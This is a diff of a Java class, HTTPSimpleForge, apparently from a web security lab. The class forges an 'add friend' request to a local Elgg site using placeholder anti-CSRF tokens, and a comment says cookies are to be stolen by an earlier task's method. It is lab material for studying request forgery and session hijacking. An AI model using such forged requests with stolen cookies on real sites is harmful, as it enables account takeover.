@@ -5,10 +5,10 @@ public class HTTPSimpleForge {
 		try {
 			int responseCode;
 			InputStream responseIn=null;
-			String requestDetails = "&__elgg_ts=<<correct_elgg_ts_value>>&__elgg_token=<<correct_elgg_token_value>>"";
+			String requestDetails = "&__elgg_ts=<<correct_elgg_ts_value>>&__elgg_token=<<correct_elgg_token_value>>";
 
 			// URL to be forged.
-			URL url = new URL ("http://localhost:8080/action/friends/add?friend=<<friend_user_guid>>"+requestDetails);
+			URL url = new URL ("http://localhost:8082/action/friends/add?friend=<<friend_user_guid>>"+requestDetails);
 
 			// URLConnection instance is created to further parameterize a
 			// resource request past what the state members of URL instance
@@ -23,18 +23,8 @@ public class HTTPSimpleForge {
 			// Here we add User-Agent HTTP header to the forged HTTP packet.
 			// Add other necessary HTTP Headers yourself. Cookies should be stolen
 			// using the method in task3.
-			urlConn.addRequestProperty("User-agent", "User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:23.0) Gecko/20100101 Firefox/23.0");
+			urlConn.addRequestProperty("User-agent", "Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:23.0) Gecko/20100101 Firefox/23.0");
 
-			//HTTP Post Data which includes the information to be sent to the server.
-//			String data = "name=...&guid=..";
-
-			// DoOutput flag of URL Connection should be set t
-			urlConn.setDoOutput(true);
-			// OutputStreamWriter is used to write the HTTP POST data
-			// to the url connection.
-			OutputStreamWriter wr = new OutputStreamWriter(urlConn.getOutputStream());
-			wr.write(data);
-			wr.flush();
 			// HttpURLConnection a subclass of URLConnection is returned by
 			// url.openConnection() since the url is an http request.
 			if (urlConn instanceof HttpURLConnection) {
